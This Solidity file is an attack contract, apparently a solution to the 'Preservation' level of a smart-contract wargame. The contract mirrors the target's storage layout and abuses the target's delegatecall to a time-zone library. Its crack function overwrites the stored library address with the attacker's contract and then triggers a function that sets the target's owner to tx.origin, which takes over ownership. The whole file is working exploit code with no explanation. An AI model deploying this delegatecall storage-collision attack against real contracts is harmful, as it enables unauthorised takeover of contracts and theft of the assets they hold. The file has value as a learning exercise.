// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation{
    function setFirstTime(uint _timeStamp) external; 
    function setSecondTime(uint _timeStamp) external;
    function timeZone1Library() external view returns(address);
    function timeZone2Library() external view returns(address);
}
contract PreservationCrack{
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint public storedTime;
    // Sets the function signature for delegatecall
    bytes4 public constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    function crack(address _target) external {
        IPreservation pre = IPreservation(_target);
        pre.setSecondTime(uint(address(this)));
        pre.setFirstTime(0);
    }
    function setTime(uint _time) external{
        owner = tx.origin;
    }
}
